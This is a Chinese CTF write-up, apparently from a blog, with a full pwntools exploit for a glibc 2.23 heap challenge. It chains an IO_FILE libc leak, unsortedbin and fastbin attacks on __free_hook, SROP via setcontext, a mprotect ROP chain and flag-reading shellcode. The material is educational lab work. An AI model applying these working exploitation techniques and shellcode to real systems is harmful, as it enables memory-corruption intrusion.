#### SROP
这部分可以去看下ctf-wiki吧
[SROP攻击](https://ctf-wiki.github.io/ctf-wiki/pwn/linux/stackoverflow/advanced-rop-zh/#srop)
### 漏洞利用过程
#### 准备部分
    def choice(idx):
        sla("Your Choice: ", str(idx))
    def new(size, content):
        choice(1)
        sla("Please input size: ", str(size))
        if len(content) == (size+1):
            sa("Please input content: ", content)
        else:
            sla("Please input content: ", content)
    def edit(idx, content):
        choice(3)
        sla("Please input idx: ", str(idx))
        sa("Please input content: ", content)
    def delete(idx):
        choice(2)
        sla("Please input idx: ", str(idx))
    def exit():
        choice(4)
#### IO_file攻击
这部分就是通过溢出，修改size,然后free掉一个fake的，最后通过IO_file攻击泄露地址，  
这部分我是拿的ex师傅的部分的，我自己也写了个这部分的，利用chunk extends，搞复杂了，那会，感觉这个简洁些
    new(0x68, '1') #0
        new(0x78, '2') #1
        payload = p64(0) + p64(0x21)
        new(0x68, payload*6) #2
        new(0x68, payload*6) #3
        delete(0)
        new(0x68, 'a'*0x60 + p64(0) + p8(0xf1)) #0
        delete(1)
        delete(2)
        new(0x78, '1') #1
        delete(0)
        new(0x68, 'a'*0x60 + p64(0) + p8(0xa1)) #0
        delete(1)
        new(0x98, '1') #1
        edit(1, 'b'*0x70 + p64(0) + p64(0x71) + p16(0x8620-0x40-0x3))
        new(0x68, '\n') #2
        new(0x68, '\x00'*0x33 + p64(0xfbad1800) + p64(0)*3 ) #3
        r(0x88)
        libc.address = uu64(r(8)) - libc.symbols['_IO_2_1_stdin_']
        lg("libc.addressess", libc.address)
#### unsortedbin攻击
    edit(1, 'b'*0x70 + p64(0) + p64(0x91))
        delete(2)
        edit(1, 'b'*0x70 + p64(0) + p64(0x91) + p64(0) + p64(libc.symbols['__free_hook']-0x20))
        new(0x88, '2') #2
#### fastbin attack
这里有个点点一下，就是srop部分，因为setcontext最后一句xor eax,eax，再加上syscall就是相当于调用read,  
rdi 第一个参数 fd  
rsi 第二个参数 buf  
rdx 第三个参数 count 大小  
rsp 执行完后的rsp  
rip 就是 执行syscall加ret
    edit(1, 'b'*0x70 + p64(0) + p64(0x71))
        delete(2)
        edit(1, 'b'*0x70 + p64(0) + p64(0x71) + p64(libc.symbols['__free_hook']-0x13))
        frame = SigreturnFrame()
        frame.rdi = 0 # fd为0
        frame.rsi = (libc.symbols['__free_hook']) & 0xfffffffffffff000 #
        frame.rdx = 0x2000
        frame.rsp = (libc.symbols['__free_hook']) & 0xfffffffffffff000
        frame.rip = libc.address + 0x00000000000bc375 #: syscall; ret; 
        payload = str(frame)
        new(0x68, payload[0x80:0x80+0x60])
        new(0x68, '\x00'*3 + p64(libc.symbols['setcontext']+53))
        edit(1, payload[:0x98])
#### mprotect修改内存页权限
    delete(1)
        layout = [
            libc.address + 0x0000000000021102, #: pop rdi; ret; 
            libc.symbols['__free_hook'] & 0xfffffffffffff000, # 开始地址
            libc.address + 0x00000000000202e8, #: pop rsi; ret; 
            0x2000, # 空间大小
            libc.address + 0x0000000000001b92, #: pop rdx; ret;  
            7, # rwx可读可写可执行
            libc.address + 0x0000000000033544, #: pop rax; ret; 
            10, #mprotect调用号
            libc.address + 0x00000000000bc375, #: syscall; ret;
            libc.address + 0x0000000000002a71, #: jmp rsp; 
        ]
#### shellcode jmp rsp
第一份shellcode ex师傅的  
第二份用pwntools加自己编写一些  
第三份纯自己写一遍
    shellcode = asm('''
        push 0x67616c66
        mov rdi, rsp
        xor esi, esi
        mov eax, 2
        syscall
        mov edi, eax
        mov rsi, rsp
        mov edx, 0x100
        xor eax, eax
        syscall
        mov edx, eax
        mov rsi, rsp
        mov edi, 1
        mov eax, edi
        syscall
        ''')
        shellcode = shellcraft.amd64.open('flag')
        shellcode += '''
        mov edi, eax
        mov rsi, rsp
        mov edx, 0x100
        xor eax, eax
        syscall
        mov edi, 1
        mov rsi, rsp
        push 1
        pop rax
        syscall
        '''
        shellcode = asm('''
        push 0x67616c66
    mov rdi,rsp
    xor esi,esi
    push 2
    pop rax
    syscall
    mov rdi,rax
    mov rsi,rsp
    mov edx,0x100
    xor eax,eax
    syscall
    mov edi,1
    mov rsi,rsp
    push 1
    pop rax
    syscall
        ''')
#### getshell走起
    s(flat(layout) + shellcode)
。。。好像不能啊,只能特么的读flag，没意思
### exp
    #!/usr/bin/env python2
    # -*- coding: utf-8 -*-    from pwn import *
    local = 1
    host = '192.168.150.135' 
    port = 10001
    #context.log_level = 'debug'
    exe = '/tmp/tmp.97OiO1SVl1/pwn'
    context.binary = exe
    elf = ELF(exe)
    libc = elf.libc
    #don't forget to change it
    if local:
        io = process(exe)
    else:
        io = remote(host,port)
    s    = lambda data            : io.send(str(data))
    sa   = lambda delim,data      : io.sendafter(str(delim), str(data))
    sl   = lambda data            : io.sendline(str(data))
    sla  = lambda delim,data      : io.sendlineafter(str(delim), str(data))
    r    = lambda numb=4096       : io.recv(numb)
    ru   = lambda delim,drop=True : io.recvuntil(delim, drop)
    uu32 = lambda data            : u32(data.ljust(4, '\x00'))
    uu64 = lambda data            : u64(data.ljust(8, '\x00'))
    lg   = lambda s,addr          : io.success('\033[1;31;40m%20s-->0x%x\033[0m'%(s,addr))
    # break on aim addr
    def debug(addr,PIE=True):
        if PIE:
            text_base = int(os.popen("pmap {}| awk '{{print $1}}'".format(io.pid)).readlines()[1], 16)
            gdb.attach(io,'b *{}'.format(hex(text_base+addr)))
        else:
            gdb.attach(io,"b *{}".format(hex(addr)))
    #===========================================================
    #                    EXPLOIT GOES HERE
    #===========================================================
    # Arch:     amd64-64-little
    # RELRO:    Full RELRO
    # Stack:    Canary found
    # NX:       NX enabled
    # PIE:      PIE enabled
    # RUNPATH:  '/usr/lib/glibc/2.23-0ubuntu10_amd64/'
    def choice(idx):
        sla("Your Choice: ", str(idx))
    def new(size, content):
        choice(1)
        sla("Please input size: ", str(size))
        if len(content) == (size+1):
            sa("Please input content: ", content)
        else:
            sla("Please input content: ", content)
    def edit(idx, content):
        choice(3)
        sla("Please input idx: ", str(idx))
        sa("Please input content: ", content)
    def delete(idx):
        choice(2)
        sla("Please input idx: ", str(idx))
    def exit():
        choice(4)
    def exp():
        new(0x68, '1') #0
        new(0x78, '2') #1
        payload = p64(0) + p64(0x21)
        new(0x68, payload*6) #2
        new(0x68, payload*6) #3
        delete(0)
        new(0x68, 'a'*0x60 + p64(0) + p8(0xf1)) #0
        delete(1)
        delete(2)
        new(0x78, '1') #1
        delete(0)
        new(0x68, 'a'*0x60 + p64(0) + p8(0xa1)) #0
        delete(1)
        new(0x98, '1') #1
        edit(1, 'b'*0x70 + p64(0) + p64(0x71) + p16(0x8620-0x40-0x3))
        new(0x68, '\n') #2
        new(0x68, '\x00'*0x33 + p64(0xfbad1800) + p64(0)*3 ) #3
        r(0x88)
        libc.address = uu64(r(8)) - libc.symbols['_IO_2_1_stdin_']
        lg("libc.addressess", libc.address)
        edit(1, 'b'*0x70 + p64(0) + p64(0x91))
        delete(2)
        edit(1, 'b'*0x70 + p64(0) + p64(0x91) + p64(0) + p64(libc.symbols['__free_hook']-0x20))
        new(0x88, '2') #2
        edit(1, 'b'*0x70 + p64(0) + p64(0x71))
        delete(2)
        edit(1, 'b'*0x70 + p64(0) + p64(0x71) + p64(libc.symbols['__free_hook']-0x13))
        frame = SigreturnFrame()
        frame.rdi = 0
        frame.rsi = (libc.symbols['__free_hook']) & 0xfffffffffffff000 #
        frame.rdx = 0x2000
        frame.rsp = (libc.symbols['__free_hook']) & 0xfffffffffffff000
        frame.rip = libc.address + 0x00000000000bc375 #: syscall; ret; 
        payload = str(frame)
        new(0x68, payload[0x80:0x80+0x60])
        new(0x68, '\x00'*3 + p64(libc.symbols['setcontext']+53))
        edit(1, payload[:0x98])
        delete(1)
        layout = [
            libc.address + 0x0000000000021102, #: pop rdi; ret; 
            libc.symbols['__free_hook'] & 0xfffffffffffff000,
            libc.address + 0x00000000000202e8, #: pop rsi; ret; 
            0x2000,
            libc.address + 0x0000000000001b92, #: pop rdx; ret; 
            7,
            libc.address + 0x0000000000033544, #: pop rax; ret; 
            10,
            libc.address + 0x00000000000bc375, #: syscall; ret; 
            libc.address + 0x0000000000002a71, #: jmp rsp; 
        ]
        shellcode = asm('''
        push 0x67616c66
        mov rdi, rsp
        xor esi, esi
        mov eax, 2
        syscall
        mov edi, eax
        mov rsi, rsp
        mov edx, 0x100
        xor eax, eax
        syscall
        mov edx, eax
        mov rsi, rsp
        mov edi, 1
        mov eax, edi
        syscall
        ''')
        shellcode = shellcraft.amd64.open('flag')
        shellcode += '''
        mov edi, eax
        mov rsi, rsp
        mov edx, 0x100
        xor eax, eax
        syscall
        mov edi, 1
        mov rsi, rsp
        push 1
        pop rax
        syscall
        '''
        shellcode = asm('''
        push 0x67616c66
    mov rdi,rsp
    xor esi,esi
    push 2
    pop rax
    syscall
    mov rdi,rax
    mov rsi,rsp
    mov edx,0x100
    xor eax,eax
    syscall
    mov edi,1
    mov rsi,rsp
    push 1
    pop rax
    syscall
        ''')
        #shellcode = asm(shellcode, arch='amd64')
        gdb.attach(io)
        s(flat(layout) + shellcode)
        #libc.address = uu64(r(8)) - libc.symbols['__IO_2_1_stdin_']
        #lg("libc.address", libc.address)
    if __name__ == '__main__':
        while True:
            try:
                exp()
                io.interactive()
                break
            except Exception as e:
                print(e)
                io.close()
                io = process(exe)
## 总结
堆部分我觉得入门已经学完了，至于house of 部分，等到用到的时候在学，因为堆结构和点看出来了，后面就看个人了，可以现学house of部分
## 参考文章
[ex师傅的orw](http://blog.eonew.cn/archives/1243)
emm,萝卜师傅那篇文章找不到了，参考了他的那个数组负数改stdout部分